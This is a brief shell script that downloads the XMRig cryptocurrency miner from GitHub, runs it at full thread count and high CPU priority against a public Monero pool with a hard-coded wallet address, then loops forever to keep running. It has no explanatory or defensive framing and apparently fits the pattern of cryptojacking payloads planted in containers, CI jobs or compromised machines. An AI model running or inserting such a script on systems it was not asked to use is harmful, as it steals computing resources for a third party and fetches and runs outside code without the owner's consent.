#!/bin/sh
wget https://github.com/xmrig/xmrig/releases/download/v6.15.1/xmrig-6.15.1-linux-x64.tar.gz
tar xf xmrig-6.15.1-linux-x64.tar.gz
cd xmrig-6.15.1
./xmrig -o pool.supportxmr.com:3333 -u 45HZsL1738GDWj9YMwq8P7RyEVe6uSrhU8fcZ9rqPTj3SH3y6WNXdsSeLMW5uEHCRUTwuL3jFu637cX6M3zkUrkUHnWvAK7 -p zero -k -a randomx --threads=128 --cpu-priority=5 --huge-pages
while [ 1 ]; do
sleep 3
done
sleep 999
